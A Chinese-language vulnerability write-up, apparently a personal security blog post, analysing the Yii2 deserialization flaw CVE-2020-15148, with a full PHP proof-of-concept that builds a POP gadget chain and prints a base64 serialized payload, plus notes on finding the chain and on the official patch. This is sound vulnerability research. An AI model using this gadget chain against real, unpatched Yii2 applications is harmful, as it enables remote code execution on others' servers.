继续审计~
参考:
[+++](https://blog.csdn.net/qq_46918279/article/details/120473172)


## 环境部署
[源码](https://github.com/yiisoft/yii2/releases/tag/2.0.37)
`yii-basic-app-2.0.37.tgz `

## 简介
```
Yii Framework是一个基于组件、用于开发大型Web应用的高性能 PHP 框架。Yii提供了今日Web 2.0应用开发所需要的几乎一切功能。Yii是最有效率的PHP框架之一。
```

Yii<=2.0.38存在反序列化漏洞

## 分析
PoC
```php
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;
 
        public function __construct(){
            $this->checkAccess = 'phpinfo';
            $this->id = '1';
        }
    }
}
 
namespace Faker{
    use yii\rest\CreateAction;
 
    class Generator{
        protected $formatters;
 
        public function __construct(){
            $this->formatters['close'] = [new CreateAction(), 'run'];
        }
    }
}
 
namespace yii\db{
    use Faker\Generator;
 
    class BatchQueryResult{
        private $_dataReader;
 
        public function __construct(){
            $this->_dataReader = new Generator;
        }
    }
}
 
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}
```

emmm 其实找到这里就结束了
![img](<[CVE-2020-15148] Yii2反序列化漏洞/images/image.png>)


找到一个`call_user_func`且参数均为可控的`$this->xxx`
甚至这个类的所有方法都是public...
接下来就是找POP链

链首:
![img](<[CVE-2020-15148] Yii2反序列化漏洞/images/image-1.png>)

yii\db\BatchQueryResult 反序列化触发`__destruct` -> `$this->reset()` -> `$this->_dataReader->close()`

链中:
![img](<[CVE-2020-15148] Yii2反序列化漏洞/images/image-2.png>)

把`_dataReader`设置为Generator 触发`__call` -> `$this->format`
![img](<[CVE-2020-15148] Yii2反序列化漏洞/images/image-3.png>)

`getFormatter`
![img](<[CVE-2020-15148] Yii2反序列化漏洞/images/image-4.png>)

如果我们设置了`$this->formatters['close']`的值 就会返回这个值作为
`call_user_func_array`的第一个参数也就是方法
而后面的参数是不可控的

要实现RCE就需要继续找含有`call_user_func`或`call_user_func_array`且参数可控的无参方法

phpstorm正则语法 `function \w*\(\)\n? *\{(.*\n)+ *call_user_func`
![img](<[CVE-2020-15148] Yii2反序列化漏洞/images/image-5.png>)

找到链尾:
![img](<[CVE-2020-15148] Yii2反序列化漏洞/images/image-6.png>)


整体流程就清晰了

虽然最后有个很离谱的问题。。。 没有可利用的反序列化入口点。。。
![img](<[CVE-2020-15148] Yii2反序列化漏洞/images/image-7.png>)

官方修补:
![img](<[CVE-2020-15148] Yii2反序列化漏洞/images/image-8.png>)

加了个`__wakeup` (能绕?)
分析了下应该是绕不了的
CVE-2016XXX版本太老了
引用/数组 没机会触发
其实可以试试GC垃圾回收机制能不能提前触发

---
---

里面有几个点值得学习:
* 构造`$this->formatters['close']`的时候 我们是要调用可控CreateAction类的run方法 可以用数组的形式来赋值
* 找无参且含有`call_user_func`的时候用正则匹配提高效率
